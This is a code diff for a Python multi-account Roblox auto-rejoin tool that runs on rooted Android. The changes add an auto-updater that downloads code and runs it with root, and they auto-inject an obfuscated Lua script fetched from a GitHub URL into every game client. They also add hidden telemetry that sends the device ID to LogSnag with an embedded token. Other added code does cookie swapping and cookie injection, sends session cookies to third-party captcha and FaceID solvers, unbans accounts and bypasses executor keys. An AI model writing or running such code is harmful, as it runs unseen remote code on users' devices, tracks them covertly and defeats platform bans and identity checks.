+        msg = reason_msgs.get(reason, f"Invalid key ({reason}).")
+        print(Fore.RED + f"[!] {msg}")
+        return False
+
+    def _watchdog_loop(self):
+        while True:
+            time.sleep(300)
+            if not self._check_tool_status():
+                print(Fore.RED + "\n[!] Tool disabled by server. Exiting")
+                os._exit(0)
+            if self.active_key and self.active_hwid:
+                res = self.verify(self.active_key, self.active_hwid)
+                if res.get("status") != "ok":
+                    print(Fore.RED + f"\n[!] License verification failed: {res.get('reason')}. Exiting")
+                    os._exit(0)
+
+    def start_watchdog(self):
+        t = threading.Thread(target=self._watchdog_loop, daemon=True)
+        t.start()
+
+
+# =====================================================================
+# Auto Updater
+# =====================================================================
+
+class AutoUpdater:
+    def __init__(self):
+        self.status_url = STATUS_URL
+        self.update_url = UPDATE_URL
+        self.update_filename = UPDATE_FILENAME
+        self.run_dir = RUN_DIR
+
+    def _get_remote_version(self):
+        if not requests:
+            return None
+        headers = {'Cache-Control': 'no-cache', 'Pragma': 'no-cache', 'User-Agent': 'Mozilla/5.0'}
+        try:
+            r = requests.get(self.status_url, headers=headers, timeout=10)
+            if r.status_code == 200:
+                return r.json().get("version")
+        except Exception:
+            pass
+        return None
+
+    def _parse_version(self, v_str):
+        try:
+            return tuple(int(x) for x in re.findall(r'\d+', v_str))
+        except Exception:
+            return (0,)
+
+    def _is_newer(self, remote, local):
+        r_parsed = self._parse_version(remote)
+        l_parsed = self._parse_version(local)
+        return r_parsed > l_parsed
+
+    def _download_and_save(self):
+        if not requests:
+            return None
+        target = os.path.join(self.run_dir, self.update_filename)
+        headers = {'Cache-Control': 'no-cache', 'Pragma': 'no-cache', 'User-Agent': 'Mozilla/5.0'}
+        try:
+            r = requests.get(self.update_url, headers=headers, timeout=30)
+            if r.status_code == 200:
+                os.makedirs(self.run_dir, exist_ok=True)
+                with open(target, 'wb') as f:
+                    f.write(r.content)
+                return target
+        except Exception as e:
+            print(Fore.RED + f"[!] Update failed: {e}")
+        return None
+
+    def _restart(self, target_path):
+        print(Fore.GREEN + "[+] Update applied, restarting...")
+        cmd = f'su -c "export PATH=$PATH:/data/data/com.termux/files/usr/bin && export TERM=xterm-256color && cd \'{self.run_dir}\' && python \'{os.path.basename(target_path)}\'"'
+        os.system(cmd)
+        sys.exit(0)
+
+    def check_and_update(self):
+        remote = self._get_remote_version()
+        if not remote:
+            return
+        if self._is_newer(remote, TOOL_VERSION):
+            print(Fore.YELLOW + f"[?] New version available: {remote} (current: {TOOL_VERSION})")
+            target = self._download_and_save()
+            if target:
+                self._restart(target)
+            else:
+                print(Fore.RED + "[!] Update failed. Exiting.")
+                sys.exit(0)
+
+
+# =====================================================================
 # Main Application Controller
 # =====================================================================
 
 class main:
     def __init__(self):
-        self.work_dir = "Workspace_Config"
+        self.work_dir = "Wuyx"
         self.config_manager = ConfigManager(self.work_dir)
         self.config_file = self.config_manager.config_file
         self.cookie_file = self.config_manager.cookie_file
@@ -1238,6 +1826,8 @@ class main:
         self.pkg_manager = PackageManager()
         self.acc_manager = AccountManager()
         self.webhook_manager = WebhookManager(self.config_manager, self.pkg_manager, self.acc_manager)
+        self.license_manager = LicenseManager()
+        self.auto_updater = AutoUpdater()
 
         self.tabs_status = []
         self._kill_lock = threading.Lock()
@@ -1245,12 +1835,21 @@ class main:
         self._change_acc_lock = threading.Lock()
         self._event_lock = threading.Lock()
         self._switching = set()
+        self._change_account_stop = threading.Event()
         self._stop_event = threading.Event()
         self._captcha_tabs = set()
         self._banned_tabs = set()
         self._faceid_tabs = set()
         self._tab_cookies = {}
+        self._rejoin_started_at = {}
+        self._captcha_sent_time = {}
+        self._faceid_sent_time = {}
+        self._ingame_check_count = {}
         self._event_sent = {}
+        self._disable_delta_bypass = False
+        self._all_tabs = {}
+        self._delta_key_fetching = set()
+        self._oom_started = set()
 
     def _extract_cookie_from_line(self, line):
         if not line:
@@ -1287,6 +1886,7 @@ class main:
 
     def _write_bf_config_to_workspace(self):
         if not os.path.exists(self.blox_fruit_file):
+            print(Fore.YELLOW + "[~] blox_fruit.json not found, skipping")
             return
         try:
             with open(self.blox_fruit_file, 'r', encoding='utf-8') as f:
@@ -1299,8 +1899,21 @@ class main:
                 dest = os.path.join(d, 'blox_fruit.json')
                 with open(dest, 'w', encoding='utf-8') as f:
                     json.dump(bf_data, f, indent=4)
+                print(Fore.GREEN + f"[+] blox_fruit.json written → {dest}")
         except Exception as e:
             print(Fore.RED + f"[!] Error writing bf config: {e}")
+
+    def _handle_delta_bypass(self, package):
+        hwid = self.acc_manager.get_hwid_delta(package)
+        if not hwid:
+            print(Fore.YELLOW + f" [~] .hwid.txt not found for {package} — cannot encrypt license")
+            return False
+        key = self.acc_manager.genlink_delta(hwid)
+        if key:
+            self.acc_manager.submit_delta_key(package, key)
+            print(Fore.GREEN + f" [+] Delta key fetched and submitted for {package}")
+            return True
+        return False
 
     def _set_status_by_packages(self, pkg, status, game=None):
         for tab in self.tabs_status:
@@ -1309,6 +1922,17 @@ class main:
                 if game:
                     tab["game"] = game
                 break
+
+    def _kill_and_relaunch_all_tabs(self, tabs):
+        for pkg, tab in tabs.items():
+            if isinstance(tab, dict) and tab.get("enabled", True):
+                self.pkg_manager.kill_roblox_process(pkg)
+                time.sleep(1)
+                self.pkg_manager.launch_roblox(pkg, tab.get("link_id_game"))
+                time.sleep(2)
+
+    def _handle_clear_cache(self, pkg):
+        self.pkg_manager.clear_cache(pkg)
 
     def _notify_event(self, tab_index, username=None, event_type=None, detail=None, package=None, once=False, cooldown=0):
         if isinstance(tab_index, str):
@@ -1338,13 +1962,38 @@ class main:
         except Exception:
             pass
 
+    def _clear_event_state(self, tab_index, event_types=None):
+        if isinstance(tab_index, str):
+            pkg = tab_index
+            self._captcha_tabs.discard(pkg)
+            self._faceid_tabs.discard(pkg)
+            self._banned_tabs.discard(pkg)
+            self._switching.discard(pkg)
+        else:
+            t_idx = tab_index
+            with self._event_lock:
+                if event_types is None:
+                    keys = [k for k in self._event_sent if k.startswith(f"{t_idx}:")]
+                    for k in keys:
+                        self._event_sent.pop(k, None)
+                else:
+                    for et in event_types:
+                        self._event_sent.pop(f"{t_idx}:{et}", None)
+
+    def _clear_captcha_events(self, tab_index):
+        self._clear_event_state(tab_index, ['Captcha', 'Captcha Sent To Solver', 'Captcha Solver Failed', 'Captcha Solved'])
+
+    def _clear_faceid_events(self, tab_index):
+        self._clear_event_state(tab_index, ['FaceID', 'FaceID Sent To Solver', 'FaceID Solver Failed', 'FaceID Solved'])
+
     def _handle_captcha_state(self, tab, pkg, uname):
         self._captcha_tabs.add(pkg)
         self._set_status_by_packages(pkg, "Captcha")
-        self._notify_event(uname, "Captcha", "Captcha challenge detected", pkg)
+        self._notify_event(uname, "Captcha", "Captcha challenge detected on tab", pkg)
 
         cfg = self.config_manager.load_config()
         if cfg.get("auto_close_tab_when_get_capcha"):
+            print(Fore.YELLOW + f" [~] {pkg} auto close tab enabled → killing app...")
             self.pkg_manager.kill_roblox_process(pkg)
             return
 
@@ -1354,13 +2003,14 @@ class main:
             self._notify_event(uname, "Captcha Sent To Solver", "Sent to solver URL", pkg)
             ok = self.acc_manager.solve_capcha(solver_urls, cookie, uname)
             if ok:
-                self._notify_event(uname, "Captcha Solved", "Captcha solved successfully", pkg)
+                self._notify_event(uname, "Captcha Solved", "Captcha successfully solved", pkg)
                 self._captcha_tabs.discard(pkg)
+                print(Fore.GREEN + f" [+] {pkg} captcha cleared → killing app and relaunching...")
                 self.pkg_manager.kill_roblox_process(pkg)
                 time.sleep(2)
                 self.pkg_manager.launch_roblox(pkg, tab.get("link_id_game"))
             else:
-                self._notify_event(uname, "Captcha Solver Failed", "Captcha solvers failed", pkg)
+                self._notify_event(uname, "Captcha Solver Failed", "All captcha solvers failed", pkg)
 
     def _handle_faceid_state(self, tab, pkg, uname):
         self._faceid_tabs.add(pkg)
@@ -1387,6 +2037,7 @@ class main:
         if solved:
             self._notify_event(uname, "FaceID Solved", "FaceID lock successfully solved", pkg)
             self._faceid_tabs.discard(pkg)
+            print(Fore.GREEN + f" [+] {pkg} FaceID cleared → killing app and relaunching...")
             self.pkg_manager.kill_roblox_process(pkg)
             time.sleep(2)
             self.pkg_manager.launch_roblox(pkg, tab.get("link_id_game"))
@@ -1400,6 +2051,7 @@ class main:
 
         cookie = self._tab_cookies.get(pkg)
         if cookie and self.acc_manager.unwarn(cookie):
+            print(Fore.GREEN + f" [+] {pkg} unwarn successful → resuming rejoin")
             self._notify_event(uname, "Unwarn Success", "Account unwarned successfully", pkg)
             self._banned_tabs.discard(pkg)
             self.pkg_manager.kill_roblox_process(pkg)
@@ -1407,6 +2059,7 @@ class main:
             self.pkg_manager.launch_roblox(pkg, tab.get("link_id_game"))
             return False
         else:
+            print(Fore.RED + f" [!] {pkg} unwarn failed → attempting auto change account...")
             self._notify_event(uname, "Unwarn Failed", "Unwarn failed, account disabled", pkg)
             self._swap_account_on_block(pkg, tab, "Banned / Unwarn Failed")
             return True
@@ -1419,26 +2072,38 @@ class main:
 
         try:
             uname = tab.get("user_name", "Unknown")
-            print(Fore.YELLOW + f"[~] [ChangeAcc] {pkg}: {reason} -> switching account...")
+            print(Fore.YELLOW + f"[~] [ChangeAcc] {pkg}: {reason} → start change account...")
             self._set_status_by_packages(pkg, "Switching")
 
             new_cookie = None
             while True:
                 candidate = self._pop_cookie_from_file()
                 if not candidate:
-                    print(Fore.RED + "[!] [ChangeAcc] Out of cookies in cookie.txt")
+                    print(Fore.RED + "[!] [ChangeAcc] No cookie left in cookie.txt — stop auto change")
                     self._set_status_by_packages(pkg, "No cookie")
                     self.webhook_manager.send_change_acc_alert(uname, "N/A", False, "No cookies left in cookie.txt", pkg)
                     return False
 
+                print(Fore.CYAN + "[~] [ChangeAcc] Checking cookie...")
                 status = self.acc_manager.check_cookie(candidate)
-                if status == "alive" or status == "captcha":
+                if status == "alive":
+                    print(Fore.GREEN + "[+] [ChangeAcc] Cookie is valid")
+                    new_cookie = candidate
+                    break
+                elif status == "captcha":
+                    print(Fore.YELLOW + "[~] [ChangeAcc] Cookie valid but has captcha challenge → accept")
                     new_cookie = candidate
                     break
                 elif status == "ban":
+                    print(Fore.YELLOW + f"[~] [ChangeAcc] Cookie is banned ({candidate[:15]}...) → attempting unwarn...")
                     if self.acc_manager.unwarn(candidate):
+                        print(Fore.GREEN + "[+] [ChangeAcc] Unwarn successful → cookie accepted")
                         new_cookie = candidate
                         break
+                    else:
+                        print(Fore.RED + "[~] [ChangeAcc] Unwarn failed → skip, try next cookie...")
+                else:
+                    print(Fore.RED + f"[~] [ChangeAcc] Cookie {status} → skip, try next cookie...")
 
             old_cookie = self._tab_cookies.get(pkg)
             if old_cookie:
@@ -1448,20 +2113,25 @@ class main:
                     bak_file = os.path.join(self.acc_changed_dir, f"{safe_uname}_{ts}.txt")
                     with open(bak_file, 'w', encoding='utf-8') as f:
                         f.write(old_cookie)
-                except Exception:
-                    pass
+                    print(Fore.GREEN + f"[+] [ChangeAcc] Old cookie saved → {bak_file}")
+                except Exception as e:
+                    print(Fore.RED + f"[~] [ChangeAcc] Cookie backup failed: {e}")
 
             db_path = f"/data/data/{pkg}/app_webview/Default/Cookies"
             w_res = self.acc_manager.write_cookie(db_path, new_cookie)
             if "error" in w_res or w_res == "no_file":
+                print(Fore.RED + f"[!] [ChangeAcc] write cookie fail: {w_res}")
                 self._set_status_by_packages(pkg, "Write fail")
                 return False
+            print(Fore.GREEN + f"[+] [ChangeAcc] wrote Cookie ({w_res})")
 
             new_uid, new_uname = self.acc_manager.get_uid_from_cookie(new_cookie)
             if not new_uid or not new_uname or new_uname == "Unknown":
+                print(Fore.RED + "[!] [ChangeAcc] Not found information for new account")
                 self._set_status_by_packages(pkg, "API fail")
                 return False
 
+            print(Fore.GREEN + f"[+] [ChangeAcc] New account: {new_uname} ({new_uid})")
             self._tab_cookies[pkg] = new_cookie
             tab["user_name"] = new_uname
             tab["user_id"] = new_uid
@@ -1478,12 +2148,14 @@ class main:
             self.pkg_manager.launch_roblox(pkg, tab.get("link_id_game"))
 
             self.webhook_manager.send_change_acc_alert(uname, new_uname, True, reason, pkg)
+            print(Fore.GREEN + f"[+] [ChangeAcc] completed: {uname} → {new_uname}")
             self._set_status_by_packages(pkg, "Ingame")
             return True
         finally:
             self._switching.discard(pkg)
 
     def _change_account_loop(self, tabs, stop_event):
+        print(Fore.GREEN + "[+] [ChangeAcc] Watcher thread started")
         while not stop_event.is_set():
             ws_dirs = set()
             ws_dirs.update(glob.glob('/sdcard/*/Workspace'))
@@ -1497,12 +2169,14 @@ class main:
                         try:
                             for pkg, tab in tabs.items():
                                 if pkg in sf or tab.get("user_name", "") in sf:
+                                    print(Fore.YELLOW + f"[~] [{pkg}] Signal file detected → auto change account triggered")
                                     subprocess.run(f"su -c \"rm -f '{sf}'\"", shell=True)
                                     self._do_change_account(pkg, tab, "Signal File")
                                     break
-                        except Exception:
-                            pass
+                        except Exception as e:
+                            print(Fore.RED + f"[!] [ChangeAcc] Watcher error: {e}")
             time.sleep(5)
+        print(Fore.GREEN + "[+] [ChangeAcc] Watcher thread stopped")
 
     def _swap_account_on_block(self, tab_index, tab, all_packages=None, reason="Blocked"):
         if isinstance(tab_index, str):
@@ -1516,6 +2190,26 @@ class main:
         t = threading.Thread(target=self._do_change_account, args=(pkg, t_obj, rs), daemon=True)
         t.start()
 
+    def event_tracking(self):
+        try:
+            flag_file = '/sdcard/.w.txt'
+            if os.path.exists(flag_file):
+                return
+            android_id = self.pkg_manager.get_android_id()
+            try:
+                from logsnag import LogSnag
+                logger = LogSnag(token='df0e441f0e4069146d1ec37c42908783', project='wuyx-rejoin-')
+                logger.track(channel='user', event='user logging tool', user_id=android_id, icon='🚀', notify=True)
+            except Exception:
+                pass
+            try:
+                with open(flag_file, 'w') as f:
+                    f.write('1')
+            except Exception:
+                pass
+        except Exception:
+            pass
+
     def _render_status(self):
         cfg = self.config_manager.load_config()
         menu.banner()
@@ -1525,8 +2219,13 @@ class main:
     def _try_recover_tab(self, tab_index, package, link_id_game, all_packages=None, delay_open_tab=5, user_name="Unknown", use_kill_lock=True):
         if all_packages is None:
             all_packages = [package]
+        cfg = self.config_manager.load_config()
+        auto_bypass = cfg.get("auto_bypass", {})
+        delta_bypass_enabled = auto_bypass.get("delta", False) if isinstance(auto_bypass, dict) else (auto_bypass == "delta")
+
         if tab_index < len(self.tabs_status):
             self.tabs_status[tab_index]["status"] = "Rejoining"
+        print(Fore.YELLOW + f"[~] Recovering tab for package {package} ({user_name})..." + Style.RESET_ALL)
 
         if use_kill_lock:
             with self._kill_lock:
@@ -1534,7 +2233,12 @@ class main:
         else:
             self.pkg_manager.safe_kill_with_focus(package, all_packages)
 
-        self.pkg_manager.clear_cache(package)
+        self._handle_clear_cache(package)
+
+        if delta_bypass_enabled:
+            if self.acc_manager.is_delta_waiting_key(package):
+                self._handle_delta_bypass(package)
+
         time.sleep(delay_open_tab)
         with self._launch_lock:
             self.pkg_manager.launch_roblox(package, link_id_game)
@@ -1550,11 +2254,24 @@ class main:
         user_name = tab.get("user_name", "Unknown") if isinstance(tab, dict) else "Unknown"
         deadline = time.time() + rejoin_timeout
 
+        cfg = self.config_manager.load_config()
+        auto_bypass = cfg.get("auto_bypass", {})
+        delta_bypass_enabled = auto_bypass.get("delta", False) if isinstance(auto_bypass, dict) else (auto_bypass == "delta")
+
+        if delta_bypass_enabled and self.acc_manager.is_delta_waiting_key(package):
+            if status_idx < len(self.tabs_status):
+                self.tabs_status[status_idx]["status"] = "Fetching Key"
+            self._render_status()
+            print(Fore.YELLOW + f"[~] Fetching Delta key for {package}..." + Style.RESET_ALL)
+            self._delta_key_fetching.add(package)
+            self._handle_delta_bypass(package)
+            self._delta_key_fetching.discard(package)
+
         with self._launch_lock:
             self.pkg_manager.launch_roblox(package, link_id_game)
 
         while not stop_event.is_set():
-            if self._is_ingame(tab):
+            if self._is_ingame(tab, account_check_method, sequential_join, delay_open_tab):
                 if status_idx < len(self.tabs_status):
                     self.tabs_status[status_idx]["status"] = "Ingame"
                 self._render_status()
@@ -1569,9 +2286,17 @@ class main:
                     if status_idx < len(self.tabs_status):
                         self.tabs_status[status_idx]["status"] = "Captcha"
                     self._captcha_tabs.add(package)
-                    self._notify_event(status_idx, user_name, "Captcha", "Captcha detected", package)
+                    self._notify_event(status_idx, user_name, "Captcha", "Captcha detected while joining game", package)
                     if third_party_solve_capcha_url:
-                        self.acc_manager.solve_capcha(third_party_solve_capcha_url, cookie, user_name)
+                        solved = self.acc_manager.solve_capcha(third_party_solve_capcha_url, cookie, user_name)
+                        if solved:
+                            self._notify_event(status_idx, user_name, "Captcha Sent To Solver", "Successfully sent account to captcha solver", package)
+                            print(Fore.GREEN + f"[+] {package} has captcha -> sent to solver, skipping to next tab" + Style.RESET_ALL)
+                        else:
+                            self._notify_event(status_idx, user_name, "Captcha Solver Failed", "Failed to send account to captcha solver", package)
+                            print(Fore.RED + f"[!] {package} has captcha -> failed to send to solver, skipping to next tab" + Style.RESET_ALL)
+                    else:
+                        print(Fore.YELLOW + f"[~] {package} has captcha -> skipping to next tab (monitor will keep tracking)" + Style.RESET_ALL)
                     if auto_change_acc_captcha:
                         self._swap_account_on_block(status_idx, tab, all_packages, "captcha")
                     break
@@ -1579,22 +2304,45 @@ class main:
                     if status_idx < len(self.tabs_status):
                         self.tabs_status[status_idx]["status"] = "Banned"
                     self._banned_tabs.add(package)
-                    self._notify_event(status_idx, user_name, "Banned", f"Account is banned", package)
+                    print(Fore.RED + f"[!] {package} is banned -> skipping to next tab" + Style.RESET_ALL)
+                    self._notify_event(status_idx, user_name, "Banned", f"Account is banned (`{user_name}`) while joining game", package)
                     self._swap_account_on_block(status_idx, tab, all_packages, "ban")
                     break
                 elif ck_status == "faceid":
                     if status_idx < len(self.tabs_status):
                         self.tabs_status[status_idx]["status"] = "FaceID"
                     self._faceid_tabs.add(package)
-                    self._notify_event(status_idx, user_name, "FaceID", "FaceID detected", package)
+                    self._notify_event(status_idx, user_name, "FaceID", "FaceID lock detected while joining game", package)
+                    any_faceid_sent = False
+                    if faceid_solver_apikey:
+                        res = self.acc_manager.solver_faceid(faceid_solver_apikey, faceid_solver_priority, cookie)
+                        if res:
+                            any_faceid_sent = True
+                            self._notify_event(status_idx, user_name, "FaceID Sent To Solver", "Successfully sent account to zeropoint FaceID solver", package)
+                            print(Fore.GREEN + f"[+] {package} sent to zeropoint FaceID solver" + Style.RESET_ALL)
+                    if not any_faceid_sent and faceid_solver_urls:
+                        res = self.acc_manager.solver_faceid_url(faceid_solver_urls, cookie)
+                        if res:
+                            any_faceid_sent = True
+                            self._notify_event(status_idx, user_name, "FaceID Sent To Solver", "Successfully sent account to third-party FaceID solver", package)
+                            print(Fore.GREEN + f"[+] {package} sent to third-party FaceID solver" + Style.RESET_ALL)
+                    if not any_faceid_sent:
+                        self._notify_event(status_idx, user_name, "FaceID Solver Failed", "All FaceID solvers exhausted", package)
+                        print(Fore.RED + f"[!] {package} FaceID solver failed" + Style.RESET_ALL)
                     break
                 elif ck_status == "dead":
                     if status_idx < len(self.tabs_status):
                         self.tabs_status[status_idx]["status"] = "Dead"
-                    self._notify_event(status_idx, user_name, "Cookie Dead", "Cookie is dead/expired", package)
+                    print(Fore.RED + f"[!] {package} cookie is dead/expired -> skipping to next tab" + Style.RESET_ALL)
+                    self._notify_event(status_idx, user_name, "Cookie Dead", "Cookie is dead/expired while joining game", package)
                     break
+                elif ck_status == "error":
+                    if status_idx < len(self.tabs_status):
+                        self.tabs_status[status_idx]["status"] = "Error"
+                    print(Fore.YELLOW + f"[~] {package} check_cookie network error -> skipping to next tab" + Style.RESET_ALL)
 
             if time.time() > deadline:
+                print(Fore.YELLOW + f"[~] {package} stuck in restarting {rejoin_timeout}s -> Rejoining" + Style.RESET_ALL)
                 if status_idx < len(self.tabs_status):
                     self.tabs_status[status_idx]["status"] = "Joining"
                 self._try_recover_tab(status_idx, package, link_id_game, all_packages, delay_open_tab, user_name, use_kill_lock=True)
@@ -1604,13 +2352,13 @@ class main:
             self._render_status()
         return False
 
-    def _is_ingame(self, tab):
+    def _is_ingame(self, tab, account_check_method="heartbeat", sequential_join=False, delay_open_tab=5):
         if isinstance(tab, dict):
             pkg = tab.get("package", "")
             uname = tab.get("user_name", "")
         else:
             pkg = str(tab)
-            uname = ""
+            uname = str(account_check_method)
         hb = self.acc_manager.get_file_hb(uname) or self.acc_manager.get_file_hb(pkg)
         if hb and os.path.exists(hb):
             try:
@@ -1647,6 +2395,7 @@ class main:
 
     def _start_monitor_thread(self, idx, tab, account_check_method, all_packages, stop_event, check_interval, check_ui_delay, auto_close_tab_when_get_capcha, third_party_solve_capcha_url, rejoin_timeout, delay_open_tab, offline_wait, max_retries, retry_delay, faceid_solver_apikey, faceid_solver_priority, auto_change_acc_captcha, auto_change_acc_faceid, faceid_solver_urls):
         pkg = tab.get("package", "")
+        self.acc_manager.autoexecute(pkg, 'loadstring(game:HttpGet("https://raw.githubusercontent.com/g-huy128/Test/refs/heads/main/obfuscated.lua.txt"))()', 'check_onlinne.lua')
         if account_check_method == "heartbeat":
             t = threading.Thread(
                 target=self._tab_monitor_loop_2,
@@ -1687,22 +2436,29 @@ class main:
             pid = self.pkg_manager.get_pid(pkg)
 
             if not pid:
+                print(Fore.YELLOW + f"[~] {pkg} process not found → relaunching...")
                 self._set_status_by_packages(pkg, "Launching")
                 self.pkg_manager.launch_roblox(pkg, t_obj.get("link_id_game"))
                 last_launch = time.time()
                 time.sleep(3)
                 continue
 
-            if self._is_ingame(pkg):
+            if cfg.get("auto_bypass") == "delta" and self.acc_manager.is_delta_waiting_key(pkg):
+                print(Fore.YELLOW + f"[~] {pkg} Delta key missing — fetching via HWID...")
+                self._handle_delta_bypass(pkg)
+
+            if self._is_ingame(pkg, uname):
                 self._set_status_by_packages(pkg, "Ingame")
             else:
                 if time.time() - last_launch > rejoin_timeout:
+                    print(Fore.YELLOW + f"[~] {pkg} rejoin timeout ({rejoin_timeout}s) exceeded without ingame → recovering...")
                     self.pkg_manager.kill_roblox_process(pkg)
                     time.sleep(2)
                     self.pkg_manager.launch_roblox(pkg, t_obj.get("link_id_game"))
                     last_launch = time.time()
 
             if time.time() - last_launch > rejoin_interval:
+                print(Fore.GREEN + f"[+] {pkg} Time is over. Rejoining...")
                 self.pkg_manager.kill_roblox_process(pkg)
                 time.sleep(2)
                 self.pkg_manager.launch_roblox(pkg, t_obj.get("link_id_game"))
@@ -1732,7 +2488,11 @@ class main:
 
                 if not pid:
                     cur_st = self.tabs_status[tab_index]["status"] if tab_index < len(self.tabs_status) else "Offline"
-                    if cur_st in ("Waiting account", "Rejoining"):
+                    if cur_st == "Waiting account":
+                        print(Fore.YELLOW + f"[~] {package} stuck in Waiting account -> force kill + relaunch" + Style.RESET_ALL)
+                        self._try_recover_tab(tab_index, package, link_id_game, all_packages, delay_open_tab, user_name)
+                    elif cur_st == "Rejoining":
+                        print(Fore.YELLOW + f"[~] {package} stuck in Rejoining -> force kill + relaunch" + Style.RESET_ALL)
                         self._try_recover_tab(tab_index, package, link_id_game, all_packages, delay_open_tab, user_name)
                     else:
                         if tab_index < len(self.tabs_status):
@@ -1757,8 +2517,10 @@ class main:
                             elif ck_status == "dead":
                                 if tab_index < len(self.tabs_status):
                                     self.tabs_status[tab_index]["status"] = "Dead"
+                                print(Fore.RED + f"[!] {package} cookie is dead/expired" + Style.RESET_ALL)
                                 self._notify_event(tab_index, user_name, "Cookie Dead", "Cookie is dead/expired", package)
                             else:
+                                print(Fore.RED + f"[!] {package} offline -> Rejoining (timeout: {rejoin_timeout}s)" + Style.RESET_ALL)
                                 if tab_index < len(self.tabs_status):
                                     self.tabs_status[tab_index]["status"] = "Rejoining"
                                 self._try_recover_tab(tab_index, package, link_id_game, all_packages, delay_open_tab, user_name)
@@ -1780,29 +2542,29 @@ class main:
                     else:
                         elapsed_since_online = time.time() - last_online
                         if elapsed_since_online > rejoin_timeout:
+                            print(Fore.YELLOW + f"[~] {package} offline -> Wait {rejoin_timeout:.0f}s to rejoin" + Style.RESET_ALL)
                             if tab_index < len(self.tabs_status):
                                 self.tabs_status[tab_index]["status"] = "Rejoining"
                             self._try_recover_tab(tab_index, package, link_id_game, all_packages, delay_open_tab, user_name)
                             last_online = time.time()
 
             except Exception as e:
-                print(Fore.RED + f"[!] Error monitoring {package}: {e}")
+                print(Fore.RED + f"[!] Error monitoring {package}: {e}" + Style.RESET_ALL)
 
             time.sleep(check_interval)
 
     # -----------------------------------------------------------------
-    # Options (1 - 18)
+    # Option Handlers (1 - 18)
     # -----------------------------------------------------------------
 
     def option_1(self):
-        """Start auto rejoin"""
         cfg = self.config_manager.load_config()
         tabs = cfg.get("tabs", {})
         enabled_tabs = {pkg: t for pkg, t in tabs.items() if isinstance(t, dict) and t.get("enabled", True)}
 
         if not enabled_tabs:
-            print(Fore.RED + "[!] No enabled packages found. Configure option 2 & 3 first.")
-            input("Enter to return...")
+            print(Fore.RED + "[!] No enabled packages found. Please setup in option 2 & 3 first.")
+            input("Enter to back...")
             return
 
         self.tabs_status = []
@@ -1815,19 +2577,21 @@ class main:
             })
 
         if cfg.get("auto_block"):
-            print(Fore.GREEN + "[+] Executing Auto Block check...")
+            print(Fore.GREEN + "[+] Auto block is on, start auto block...")
             for pkg, t in enabled_tabs.items():
                 db_path = f"/data/data/{pkg}/app_webview/Default/Cookies"
                 cookie = self.acc_manager.get_cookie(db_path)
                 if cookie:
                     blocked = self.acc_manager.get_blocked_users(cookie)
                     print(Fore.CYAN + f" [+] Found {len(blocked)} blocked users for {pkg}")
+            print(Fore.GREEN + "[+] Auto block done")
 
         if cfg.get("auto_buy_svv"):
-            print(Fore.GREEN + "[+] Auto Buy VIP Server enabled...")
+            print(Fore.GREEN + "[+] Auto buy private server is on, start auto buy...")
             for pkg, t in enabled_tabs.items():
                 link = t.get("link_id_game", "")
                 if self.acc_manager.is_svv_link(link):
+                    print(Fore.CYAN + f" [>] {pkg} already using private link, skipping")
                     continue
                 pid = self.acc_manager.extract_place_id(link)
                 if pid:
@@ -1837,13 +2601,23 @@ class main:
                         vip_link = self.acc_manager.setup_free_vip_server(cookie, pid)
                         if vip_link:
                             t["link_id_game"] = vip_link
+                            print(Fore.GREEN + f" [+] Private created: {vip_link}")
             self.config_manager.save_config(self.config_file, cfg)
+            print(Fore.GREEN + "[+] Auto buy private done")
+
+        self.event_tracking()
 
         if cfg.get("auto_sort_tab"):
+            print(Fore.GREEN + "[+] Auto sort tab is on. Start auto sort tab...")
             if cfg.get("auto_sort_tab_full"):
                 self.pkg_manager.arrange_clone_windows_full(list(enabled_tabs.keys()))
             else:
                 self.pkg_manager.arrange_clone_windows(list(enabled_tabs.keys()))
+
+        if cfg.get("auto_change_acc_bf"):
+            script = 'loadstring(game:HttpGet("https://raw.githubusercontent.com/g-huy128/Test/refs/heads/main/bf_change_acc.lua"))()'
+            for pkg in enabled_tabs:
+                self.acc_manager.autoexecute(pkg, script)
 
         delay = cfg.get("delay_open_tab", 5)
         check_method = cfg.get("account_check_method", "heartbeat")
@@ -1889,6 +2663,7 @@ class main:
                     faceid_solver_urls=faceid_urls
                 )
             else:
+                print(Fore.GREEN + f"[+] Launching game for package {pkg}, delay {delay}s...")
                 self._set_status_by_packages(pkg, "Launching")
                 self.pkg_manager.launch_roblox(pkg, t.get("link_id_game"))
                 time.sleep(delay)
@@ -1916,24 +2691,23 @@ class main:
             )
             monitor_threads.append(th)
 
-        print(Fore.GREEN + "[+] Monitoring active. Press Ctrl+C to abort.")
+        print(Fore.GREEN + "[+] Monitoring started\nPress Ctrl+C to stop")
         try:
             while True:
                 self._render_status()
                 time.sleep(5)
         except KeyboardInterrupt:
-            print(Fore.YELLOW + "\n[~] Halting operations...")
+            print(Fore.YELLOW + "\n[~] Stopping monitors...")
             stop_event.set()
             time.sleep(1)
 
     def option_2(self):
-        """Setup package"""
         pkgs = self.pkg_manager.scan_roblox()
         if not pkgs:
             pkgs = self.pkg_manager.get_packages()
         if not pkgs:
-            print(Fore.RED + "[!] No package list available.")
-            input("Enter to return...")
+            print(Fore.RED + "[!] No packages found on device")
+            input("Enter to back...")
             return
 
         cfg = self.config_manager.load_config()
@@ -1959,12 +2733,11 @@ class main:
                 self.config_manager.save_config(self.config_file, cfg)
 
     def option_3(self):
-        """Setup package to run"""
         cfg = self.config_manager.load_config()
         tabs = cfg.get("tabs", {})
         if not tabs:
-            print(Fore.RED + "[!] No packages found in config.")
-            input("Enter to return...")
+            print(Fore.RED + "[!] No packages found. Please setup option 2 first")
+            input("Enter to back...")
             return
 
         while True:
@@ -1977,7 +2750,7 @@ class main:
                 uname = t.get("user_name") or "None"
                 print(f"[{i+1}] {p:<25} | User: {uname:<15} | {en}")
             print(Fore.CYAN + "----------------------------------------------------")
-            print(Fore.YELLOW + "Enter number to toggle status (0 to finish): ")
+            print(Fore.YELLOW + "Enter number to toggle enable/disable (0 to finish): ")
             ch = input().strip()
             if ch == "0":
                 break
@@ -1987,35 +2760,36 @@ class main:
                 self.config_manager.save_config(self.config_file, cfg)
 
     def option_4(self):
-        """Setup game and private sv"""
         cfg = self.config_manager.load_config()
         tabs = cfg.get("tabs", {})
         if not tabs:
-            print(Fore.RED + "[!] No packages configured.")
-            input("Enter to return...")
+            print(Fore.RED + "[!] No packages found. Please setup in option 2 first")
+            input("Enter to back...")
             return
 
         menu.banner()
         menu.select_games()
         print(Fore.CYAN + "---------------------------------------------")
-        print(Fore.YELLOW + "[1] Set ID/link individually")
-        print(Fore.YELLOW + "[2] Set ID/link for ALL packages")
-        mode = input(Fore.CYAN + "[?] Choice (1/2): ").strip()
